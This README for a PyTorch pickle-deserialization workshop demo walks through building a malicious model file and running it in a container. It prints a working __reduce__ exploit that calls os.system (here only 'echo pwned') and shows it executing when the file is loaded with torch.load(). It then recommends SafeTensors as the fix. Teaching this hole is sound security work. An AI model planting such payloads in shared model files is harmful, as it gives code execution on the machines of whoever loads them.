# Malicious Pickle Demo - RSA Workshop

This demonstrates the pickle deserialization vulnerability in PyTorch model loading.

## Build and Run

```bash
# Build the container
docker build -t pickle-exploit-demo .

# Run interactively
docker run --rm -it pickle-exploit-demo
```

## Inside the Container

### Step 1: Create the malicious model
```bash
python create_malicious_model.py
```

This creates `malicious_model.pt` containing a payload that executes when loaded.

### Step 2: Demonstrate the attack
```bash
python create_malicious_model.py attack
```

Watch as:
1. The file `/tmp/pwned_by_pickle.txt` doesn't exist
2. We load the "model" with `torch.load()`
3. Arbitrary code executes automatically
4. The file `/tmp/pwned_by_pickle.txt` now exists

### Step 3: Inspect the pickle

```bash
fickling malicious_model.pt
```

This shows the decompiled pickle bytecode and the malicious payload.

## The Vulnerability

The vulnerable code pattern:
```python
model = torch.load("model.pt")  # Executes arbitrary code!
```

The exploit uses Python's `__reduce__` method:
```python
class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("echo pwned",))
```

When `pickle.loads()` (which `torch.load()` uses internally) encounters this, it:
1. Calls `os.system`
2. Passes `"echo pwned"` as the argument
3. Executes the command

## The Fix: SafeTensors

SafeTensors is a safe serialization format that cannot execute code:

```python
from safetensors.torch import save_model, load_model

# Save safely
save_model(model, "model.safetensors")

# Load safely - no code execution possible
load_model(model, "model.safetensors")
```
